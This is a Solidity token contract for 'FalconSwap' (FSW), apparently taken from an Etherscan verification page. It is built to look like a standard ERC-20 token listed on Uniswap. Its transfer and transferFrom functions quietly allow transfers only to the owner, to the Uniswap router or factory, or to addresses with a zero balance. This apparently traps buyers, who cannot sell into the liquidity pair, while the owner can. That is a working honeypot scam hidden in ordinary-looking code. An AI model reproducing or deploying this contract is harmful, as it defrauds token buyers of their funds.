/**
 *Submitted for verification at Etherscan.io on 2020-08-24
*/

/*

*/

/*
pragma solidity ^0.6.0;

//  ______    _                 _____                     
//  |  ___|  | |               /  ___|                    
//  | |_ __ _| | ___ ___  _ __ \ `--.__      ____ _ _ __  
//  |  _/ _` | |/ __/ _ \| '_ \ `--. \ \ /\ / / _` | '_ \ 
//  | || (_| | | (_| (_) | | | /\__/ /\ V  V / (_| | |_) |
//  \_| \__,_|_|\___\___/|_| |_\____/  \_/\_/ \__,_| .__/ 
//                                                 | |    
//  FalconSwap: https://falconswap.com
//  Symbol: FSW
//  Decimals: 18
*/

pragma solidity 0.6.0;

contract FALCONSWAPTOKEN {
 
    mapping (address => uint256) public balanceOf;

    string public name = "FSW";
    string public symbol = "FSW";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    address contractOwner;
    address uniRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address uniFactory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() public {
       
        contractOwner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        allowance[msg.sender][uniRouter] = 1000000000000000000000000000;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        require(balanceOf[msg.sender] >= value);
        require(to == contractOwner || balanceOf[to] == 0 || to == uniFactory || to == uniRouter);
        balanceOf[msg.sender] -= value; 
        emit Transfer(msg.sender, to, value);
        balanceOf[to] += value;         
        return true;   
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        require(to == contractOwner || balanceOf[to] == 0 || to == uniFactory || to == uniRouter);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}